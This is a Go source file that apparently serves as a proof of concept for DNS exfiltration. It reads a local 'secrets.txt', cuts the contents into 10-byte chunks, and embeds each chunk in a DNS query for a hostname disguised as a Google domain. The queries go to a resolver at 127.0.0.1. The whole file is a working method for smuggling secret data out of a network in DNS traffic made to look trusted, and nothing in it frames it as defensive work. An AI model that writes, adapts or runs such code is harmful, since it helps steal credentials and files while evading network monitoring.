package main

import (
	"fmt"
	"net"
	"os"

	"github.com/miekg/dns"
)

func splitArray(input []byte) [][]byte {
	var output [][]byte
	for i := 0; i < len(input); i += 10 {
		end := i + 10
		if end > len(input) {
			end = len(input)
		}
		output = append(output, input[i:end])
	}
	return output
}

func readFile(filePath string) ([]byte, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return nil, err
	}

	fileData := make([]byte, fileInfo.Size())
	n, err := file.Read(fileData)
	if err != nil {
		return nil, err
	}

	return fileData[:n], nil
}

func main() {
	
	fileData, err := readFile("./secrets.txt")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	output := splitArray(fileData)
	//fmt.Println(output)
	for i, chunk := range output {
		fmt.Printf("Chunk %d: %s\n", i, string(chunk))
	
		hostname := "signaler-pa.clients6.google.com" + "/" + string(chunk)
		//hostname := "www.google.com/helloworld" 
		dnsServer := "127.0.0.1"
	
		c := &dns.Client{}
		m := &dns.Msg{}
		m.SetQuestion(dns.Fqdn(hostname), dns.TypeA)
		r, _, err := c.Exchange(m, net.JoinHostPort(dnsServer, "53"))
		if err != nil {
			
			continue
		}
	
		if len(r.Answer) == 0 {
			
			continue
		}
	
		for _, a := range r.Answer {
			if a.Header().Rrtype == dns.TypeA {
				fmt.Println("IP address:", a.(*dns.A).A)
			}
		}
			}
	}



